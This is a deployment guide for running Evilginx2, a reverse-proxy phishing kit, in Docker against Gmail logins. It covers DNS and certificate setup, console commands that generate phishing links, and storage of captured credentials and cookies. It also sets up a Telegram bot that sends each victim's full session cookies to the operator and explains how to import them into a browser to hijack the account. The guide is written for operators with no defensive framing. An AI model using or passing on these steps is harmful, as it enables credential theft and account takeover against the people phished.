# Evilginx2 — Docker Deployment Guide

## 1. Prerequisites

- A Linux server (VPS) with:
  - Ports **53, 80, 443** free and reachable from the internet
    (`systemctl stop systemd-resolved` or set `DNSStubListener=no`
    on Ubuntu to free port 53)
  - Docker Engine + Docker Compose v2
- A domain with DNS pointing at the server:
  - **A record**: `evilginx.yourdomain.com` → server IP
  - **Wildcard record**: `*.evilginx.yourdomain.com` → server IP
    (required — every phishlet uses multiple subdomains)

## 2. Clone & configure

```bash
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2
chmod +x entrypoint.sh telegram-watch.sh
cp .env.example .env   # or create it (see below)
```

`.env`:
```env
TZ=Africa/Lagos
TG_BOT_TOKEN=123456:ABCDEF-your-bot-token
TG_CHAT_ID=123456789
```

- `TG_BOT_TOKEN`: create a bot via [@BotFather](https://t.me/BotFather) on Telegram
- `TG_CHAT_ID`: send your bot one message, then open
  `https://api.telegram.org/bot<TOKEN>/getUpdates` and read `chat.id`

Leave both empty to disable Telegram.

## 3. Build & start

```bash
docker compose build
docker compose up -d
docker compose attach evilginx
```

> `attach` opens the live evilginx console. Detach with **Ctrl-p then Ctrl-q**
> (never Ctrl-c — that kills evilginx).

## 4. First-run setup (inside the evilginx console)

```
config domain evilginx.yourdomain.com
config ip 1.2.3.4              # your public server IP
phishlets hostname gmail evilginx.yourdomain.com
phishlets get-certs gmail       # pulls Let's Encrypt certs (needs port 80)
phishlets enable                # or: phishlets enable gmail
lhosts gmail                    # generates phishing links
```

Send a phishing link to yourself and test a full login in a private browser
window before going live.

## 5. Persistence

Everything survives restarts / image rebuilds:

| Host directory | Purpose |
|---|---|
| `./phishlets` | Phishlet files (seeded from image on first run only) |
| `./sessions`  | Captured credentials & cookies (JSON per session) |
| `./certs`     | Let's Encrypt certificates |

## 6. Telegram notifications

When a visitor completes login, the watcher posts:
- a summary message (username, phishlet, URL)
- the **full raw session JSON** containing all captured cookies

To import cookies into a browser: save the JSON, log into your phishing
URL in the browser, then reload the JSON cookies using a cookie-import
browser extension.

## 7. Live monitoring / troubleshooting

```bash
docker compose attach evilginx   # live console (captures show here)
docker logs -f evilginx2         # background log view
docker compose restart           # restart after code/config changes
```

| Symptom | Likely cause |
|---|---|
| `get-certs` fails | Port 80 blocked / DNS not pointing at server yet |
| Gmail page blank | Victim landed on wrong subdomain — use `lhosts` links only |
| Session dies mid-login | Wildcard DNS record missing |
| Telegram silent | Wrong token/chat_id; check `curl https://api.telegram.org/bot<TOKEN>/getMe` |
| Permission denied in logs | Volume dirs are root-owned; the entrypoint fixes this, but ensure you're on the compose file above |
| Bind error on 53 | `systemd-resolved` running on host → disable DNSStubListener, or drop `network_mode: host` |

## 8. Updating

```bash
git pull
docker compose build
docker compose up -d
```
